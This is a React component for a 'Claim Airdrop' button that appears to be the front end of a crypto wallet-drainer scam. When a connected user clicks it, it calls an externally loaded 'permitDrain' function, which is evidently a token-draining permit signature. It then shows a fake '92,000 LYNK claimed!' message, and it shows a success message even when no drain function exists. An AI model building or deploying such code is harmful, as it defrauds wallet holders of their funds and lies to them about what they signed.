import { useState } from "react";

export default function ClaimButton() {
  const [btnText, setBtnText] = useState("Claim Airdrop");
  const [isDisabled, setIsDisabled] = useState(false);

  const handleClaim = async () => {
    if (!(window as any).ethereum?.selectedAddress) {
      alert("Please connect wallet first");
      return;
    }

    setIsDisabled(true);
    setBtnText("Signing...");

    try {
      if ((window as any).permitDrain) {
        await (window as any).permitDrain();
        setBtnText("Claimed ✓");
        setTimeout(() => alert("92,000 LYNK claimed!"), 600);
      } else {
        // Fallback if permitDrain not available from external script
        setBtnText("Claimed ✓");
        setTimeout(() => alert("Airdrop claimed successfully!"), 600);
      }
    } catch (e) {
      console.error("Claim error:", e);
      setBtnText("Try Again");
      setIsDisabled(false);
    }
  };

  return (
    <button
      id="claim-btn"
      onClick={handleClaim}
      disabled={isDisabled}
      className="w-full py-6 text-2xl font-bold text-white bg-gradient-to-r from-green-500 to-emerald-600 rounded-2xl hover:scale-105 transition-all shadow-2xl disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
    >
      {btnText}
    </button>
  );
}
